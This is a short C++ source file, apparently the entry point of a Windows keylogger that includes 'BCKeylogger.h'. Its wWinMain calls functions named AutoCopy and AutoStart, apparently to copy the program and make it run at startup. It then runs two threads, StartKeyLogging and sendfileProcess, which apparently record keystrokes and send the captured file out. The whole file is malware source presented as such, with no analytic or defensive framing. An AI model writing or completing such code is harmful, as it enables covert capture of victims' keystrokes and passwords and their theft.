#include <thread>
#include "BCKeylogger.h"

using namespace std;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	userpath();
	AutoCopy();
	AutoStart();

	std::thread t1(StartKeyLogging);
	std::thread t2(sendfileProcess);

	t1.join();
	t2.join();
}